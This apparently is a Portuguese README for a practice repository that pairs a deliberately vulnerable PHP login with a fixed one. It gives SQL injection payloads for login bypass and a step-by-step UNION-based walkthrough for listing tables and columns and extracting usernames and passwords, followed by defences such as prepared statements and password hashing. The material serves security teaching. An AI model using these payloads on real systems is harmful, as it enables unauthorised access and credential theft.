SQL Injection - Exemplo de login vulnerável e um login corrigido.

obs.: Os usuários que tem a senha em hash somente logam no login.php.

Temos dois logins.

login.php - Onde as vulnerabilidades foram corrigidas.
login_vul.php - Onde você efetuara os testes abaixo, esse é o nosso login vulnerável.
Temos também uma falha no banco que permite a execução da do teste número 2.

Como Testar Corretamente a Vulnerabilidade?

Na página login_vul.php

Teste esse payload simples:

obs.: Após o payload tem um espaço, não esqueça dele.

### Teste 1 ###
Nesse teste, é adicionado ao final dois traços, informando a query sql que será montada pela aplicação que o que vem a seguir é comentario e não precisa ser executado, com isso invalidamos o retante da query.

Username: admin' --
Password: [qualquer coisa]

### Teste 2 ###
Neste teste a consulta se torna:
SELECT * FROM usuarios WHERE login = 'admin' OR '1'='1' AND senha = '...';
'1'='1' é SEMPRE verdadeiro em SQL
Isso faz com que toda a condição seja verdadeira, ignorando a verificação da senha

Username: admin' OR '1'='1
Password: x
Deve retornar o primeiro usuário da tabela

### Teste 3 ###
Caso o anterior não funcione.
Username: admin' OR 1=1 --
Password: x


Agora segue um passo a passo de todos os teste possíveis em linha de raciocinio.

Este tutorial demonstra como explorar uma vulnerabilidade de SQL Injection em um sistema de login vulnerável, usando técnicas para:

✅ Descobrir o número de colunas
✅ Identificar colunas úteis
✅ Extrair dados sensíveis (usuários, senhas, tabelas)

🔍 Passo 1: Confirmar a Vulnerabilidade
Payload básico para verificar SQL Injection:

sql

' OR '1'='1

Se o login for bem-sucedido sem credenciais válidas, o sistema é vulnerável.

Exemplo de query resultante:

sql

SELECT * FROM usuarios WHERE username = '' OR '1'='1' AND password = 'qualquer';
→ Retorna todos os usuários porque '1'='1' é sempre verdadeiro.

📏 Passo 2: Descobrir o Número de Colunas (ORDER BY)
Usamos ORDER BY para determinar quantas colunas a tabela tem.

Técnica: Incrementar até dar erro
sql

' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
...  

Exemplo:

Se ORDER BY 5 funcionar, mas ORDER BY 6 der erro → 5 é o número de colunas.

🔄 Passo 3: Confirmar Colunas com UNION SELECT
O UNION SELECT exige o mesmo número de colunas da query original.

Payload genérico (substitua X pelo nº de colunas):
sql

' UNION SELECT 1,2,3,...,X--  

Exemplo para 4 colunas:

sql

' UNION SELECT 1,2,3,4--  

O que observar:

Se aparecerem números na tela (ex: 2 e 3), essas são colunas visíveis (úteis para extrair dados).

📦 Passo 4: Extrair Nomes das Tabelas (SQL Injection em INFORMATION_SCHEMA)
Se soubermos que o banco é MySQL/MariaDB, podemos listar tabelas:

Payload para listar tabelas:
sql

' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema = database()--  

Resultado esperado:

Nomes de tabelas como usuarios, clientes, produtos, etc.

🔓 Passo 5: Extrair Colunas de uma Tabela
Suponha que descobrimos a tabela usuarios. Podemos listar suas colunas:

Payload para listar colunas:
sql

' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name = 'usuarios'--  

Resultado esperado:

Colunas como id, username, password, email, etc.

💻 Passo 6: Extrair Dados Sensíveis (Usuários e Senhas)
Agora que sabemos a estrutura, extraímos os dados:

Payload para extrair usuários e senhas:
sql

' UNION SELECT 1,username,password,4 FROM usuarios--  

Se as senhas estiverem em texto puro:
→ Aparecerão diretamente.

Se estiverem hasheadas (ex: MD5, SHA-1):
→ Podemos tentar quebrar offline com ferramentas como John the Ripper ou Hashcat.

🛡️ Como se Proteger? 
Use Prepared Statements:

php

$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

Armazene senhas com hash (ex: password_hash() + password_verify())

Valide entradas (filtros, regex, escape de caracteres)

📌 Conclusão
Este tutorial mostrou como:

1️⃣ Testar vulnerabilidade (' OR '1'='1)
2️⃣ Descobrir colunas (ORDER BY e UNION SELECT)
3️⃣ Extrair tabelas e colunas (information_schema)
4️⃣ Extrair dados (usuários e senhas)

Se você chegou até aqui parabéns.
Adicionei um arquivo de deploy que faz verificações de segurança, você pode checar no menu do repositório na aba Security.
